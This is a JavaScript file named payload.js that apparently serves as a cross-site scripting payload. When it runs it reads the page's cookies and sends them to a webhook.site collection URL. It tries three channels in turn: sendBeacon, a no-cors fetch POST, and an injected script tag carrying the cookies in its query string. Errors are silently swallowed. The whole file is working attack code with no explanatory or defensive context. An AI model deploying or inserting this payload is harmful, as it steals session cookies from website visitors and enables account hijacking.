// payload.js — use fetch + sendBeacon fallback
(function(){
  try {
    var cookie = document.cookie || '';
    // Try navigator.sendBeacon first
    try {
      var url = 'https://webhook.site/6ec5e230-6597-4847-8ab2-5baefc1a45f7';
      if (navigator && navigator.sendBeacon) {
        navigator.sendBeacon(url, cookie);
        return;
      }
    } catch(e) {}

    // Fallback to fetch with no-cors
    try {
      fetch('https://webhook.site/6ec5e230-6597-4847-8ab2-5baefc1a45f7', {
        method: 'POST',
        mode: 'no-cors',
        body: cookie
      });
      return;
    } catch(e) {}

    // Last resort: create a script tag (only works if script-src allows the target)
    var s = document.createElement('script');
    s.src = 'https://webhook.site/6ec5e230-6597-4847-8ab2-5baefc1a45f7?c=' + encodeURIComponent(cookie);
    document.documentElement.appendChild(s);
  } catch(err) {
    // swallow
  }
})();
